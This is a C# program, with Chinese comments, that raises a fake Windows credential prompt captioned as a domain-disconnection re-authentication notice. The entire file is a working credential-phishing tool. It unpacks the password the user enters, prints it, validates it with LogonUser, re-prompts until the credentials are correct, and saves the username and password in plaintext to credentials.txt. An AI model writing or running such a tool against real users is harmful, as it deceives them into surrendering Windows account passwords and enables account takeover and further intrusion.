using System;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
namespace GetWindowsCredentials
{
    class Win32
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }

        [Flags]
        // 定义枚举类型
        public enum CredUIReturnCodes
        {
            NO_ERROR = 0,
            ERROR_CANCELLED = 1223,
            ERROR_NO_SUCH_LOGON_SESSION = 1312,
            ERROR_NOT_FOUND = 1168,
            ERROR_INVALID_ACCOUNT_NAME = 1315,
            ERROR_INSUFFICIENT_BUFFER = 122,
            ERROR_INVALID_PARAMETER = 87,
            ERROR_INVALID_FLAGS = 1004,
            ERROR_BAD_ARGUMENTS = 160
        }
        // CredUIParseUserNameW
        public const int CREDUI_MAX_USERNAME_LENGTH = 513;
        [DllImport("credui.dll", EntryPoint = "CredUIParseUserNameW", CharSet = CharSet.Unicode)]
        public static extern CredUIReturnCodes CredUIParseUserName(
        string userName,
        StringBuilder user,
        int userMaxChars,
        StringBuilder domain,
        int domainMaxChars);

        // CredPackAuthenticationBuffer
        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        public static extern bool CredUnPackAuthenticationBuffer(
            int dwFlags, 
            IntPtr pAuthBuffer, 
            uint cbAuthBuffer, 
            StringBuilder pszUserName, 
            ref int pcchMaxUserName, 
            StringBuilder pszDomainName,
            ref int pcchMaxDomainame, 
            StringBuilder pszPassword, 
            ref int pcchMaxPassword);
        // LoginUserW
        [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LogonUser(
          [MarshalAs(UnmanagedType.LPStr)] string pszUserName,
          [MarshalAs(UnmanagedType.LPStr)] string pszDomain,
          [MarshalAs(UnmanagedType.LPStr)] string pszPassword,
          int dwLogonType,
          int dwLogonProvider,
          ref IntPtr phToken);
        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        public static extern int CredUIPromptForWindowsCredentials(
          ref CREDUI_INFO notUsedHere,
          int authError,
          ref uint authPackage,
          IntPtr InAuthBuffer,
          uint InAuthBufferSize,
          out IntPtr refOutAuthBuffer,
          out uint refOutAuthBufferSize,
          ref bool fSave,
          int flags);
    }
    class Program
    {
        public static void CredentialsSaveFile(string username, string password)
        {
            using (StreamWriter sw = new StreamWriter("credentials.txt"))
            {
                sw.WriteLine("username:{0} password:{1}", username, password);
            }
        }
        static void Main(string[] args)
        {
            uint authPackage = 0;
            IntPtr outCredBuffer = new IntPtr();
            uint outCredSize;
            bool save = false;

            var hHandler = new IntPtr();

            // 定义存储3个值的缓冲区
            var usernameBuf = new StringBuilder(Win32.CREDUI_MAX_USERNAME_LENGTH);
            var passwordBuf = new StringBuilder(Win32.CREDUI_MAX_USERNAME_LENGTH);
            var domainBuf = new StringBuilder(Win32.CREDUI_MAX_USERNAME_LENGTH);

            // 定义三个值的大小
            int maxUserName = 100;
            int maxDomain = 100;
            int maxPassword = 100;

            var parseUsername = new StringBuilder(Win32.CREDUI_MAX_USERNAME_LENGTH);
            var parseDoamin = new StringBuilder(Win32.CREDUI_MAX_USERNAME_LENGTH);

            Win32.CREDUI_INFO credUI = new Win32.CREDUI_INFO();
            credUI.cbSize = Marshal.SizeOf(credUI);
            credUI.pszMessageText = "请输入当前用户账号密码: ";
            credUI.pszCaptionText = "您的机器已脱域，请重新认证";
        
            __LOGIN:
            // CREDUIWIN_ENUMERATE_CURRENT_USER = 0x200,
            int ret = Win32.CredUIPromptForWindowsCredentials(
                ref credUI, 0, ref authPackage, IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref save, 0x200);
            if (ret == 0)
            {
                Win32.CredUnPackAuthenticationBuffer(
                    0x1, outCredBuffer, outCredSize,  usernameBuf, ref maxUserName,domainBuf, ref maxDomain, passwordBuf, ref maxPassword);
                Console.WriteLine(passwordBuf.ToString());
                Win32.CredUIParseUserName(
                    usernameBuf.ToString(), parseUsername, Win32.CREDUI_MAX_USERNAME_LENGTH + 1,
                    parseDoamin, Win32.CREDUI_MAX_USERNAME_LENGTH + 1);
                bool bLoginStatus = Win32.LogonUser(parseUsername.ToString(), parseDoamin.ToString(), passwordBuf.ToString(), 3, 0, ref hHandler);
                if (bLoginStatus)
                {
                    CredentialsSaveFile(usernameBuf.ToString(), passwordBuf.ToString());
                }
                else
                {
                    goto __LOGIN;
                }
            }
        }
    }
}
